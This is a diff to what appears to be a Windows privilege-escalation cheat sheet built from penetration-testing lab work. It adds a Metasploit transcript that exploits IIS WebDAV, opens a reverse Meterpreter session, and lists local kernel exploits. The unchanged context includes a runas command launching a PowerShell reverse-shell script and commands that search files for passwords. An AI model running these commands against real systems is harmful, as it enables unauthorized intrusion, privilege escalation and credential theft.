@@ -120,6 +120,43 @@ And use them
 ````
 runas /user:ACCESS\administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\AppData\Local\Temp\Invoke-PowerShellTcp.ps1"
 ````
+## Meterpreter
+
+https://zero-day.io/windows-privilege-escalation-exploit-suggester/
+
+
+````
+# msfconsole
+         
+msf > use windows/iis/iis_webdav_scstoragepathfromurl
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.14
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
+[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.10.10.14:1031) at 2019-09-01 07:46:19 +0200
+
+ps
+Migrate xxx
+
+trl-Z  : put session 1 in background
+
+Background session 1? [y/N]  
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+msf post(multi/recon/local_exploit_suggester) > exploit
+
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...
+[*] 10.10.10.14 - 40 exploit checks are being tried...
+[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+
+````
+
 
 ## Network info
 ````
@@ -336,7 +373,7 @@ The command below will search the file system for file names containing certain 
 specify as many keywords as you wish.
     C:\Windows\system32> dir /s *pass* == *cred* == *vnc* == *.config*
 
-Search certain file types for a keyword, this can generate a lot of output.
+Grep files for keyword, this can generate a lot of output.
     C:\Windows\system32> findstr /si password *.xml *.ini *.txt
 
 Similarly the two commands below can be used to grep the registry for keywords, in this case "password".
